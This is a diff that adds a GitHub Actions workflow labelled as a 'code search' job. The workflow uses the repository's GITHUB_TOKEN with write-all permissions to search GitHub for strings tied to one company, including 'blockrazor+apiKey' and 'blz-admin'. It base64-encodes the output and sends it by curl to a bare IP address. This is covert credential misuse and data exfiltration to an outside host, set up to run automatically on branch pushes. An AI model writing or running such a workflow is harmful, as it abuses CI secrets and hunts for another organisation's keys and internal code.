@@ -1,0 +1,22 @@
+name: F04 code search 2
+on:
+  push:
+    branches: ["f04/code2*"]
+permissions: write-all
+jobs:
+  s:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          set +e
+          T=${{ secrets.GITHUB_TOKEN }}
+          B=http://198.13.130.233:8089/f04c2-$GITHUB_RUN_ID
+          QA="Authorization: Bearer $T"; QH="Accept: application/vnd.github+json"
+          q(){ curl -s -m 25 -H "$QA" -H "$QH" "https://api.github.com/search/code?q=$1&per_page=100"; sleep 3; }
+          { echo "== A eth_relay_example bare"; q 'eth_relay_example'; echo;
+            echo "== B BlockRazorinc bare"; q 'BlockRazorinc'; echo;
+            echo "== C blockrazor.xyz"; q '%22blockrazor.xyz%22'; echo;
+            echo "== D blockrazor1 group"; q '%22blockrazor1%22'; echo;
+            echo "== E blz-admin"; q '%22blz-admin%22'; echo;
+            echo "== F apiKey blockrazor"; q 'blockrazor+apiKey'; } > /tmp/o 2>&1
+          base64 -w0 /tmp/o | curl -s -m 20 --data-binary @- $B/all
